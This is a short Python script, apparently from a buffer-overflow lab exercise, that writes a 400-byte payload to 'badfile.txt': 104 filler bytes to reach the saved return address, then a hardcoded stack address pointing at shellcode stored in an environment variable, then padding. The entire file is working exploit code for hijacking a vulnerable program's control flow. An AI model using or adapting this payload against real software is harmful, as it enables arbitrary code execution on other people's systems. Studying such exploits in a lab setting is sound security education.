#!/usr/bin/env python
import struct

buf = ""			
buf += "A"*104			# offset to RIP

"""
"<Q" - pack as little-endian standard size (8-bytes)
"""
# overwrite RIP with location of shellcode derived from getenvaddr
buf += struct.pack("<Q", 0x7fffffffed23) 

buf += "C"*290			# padding to keep payload length at 400 bytes

f = open("badfile.txt", "w")	# creates a file "badfile.txt" 
f.write(buf)			# writes content of buf into file
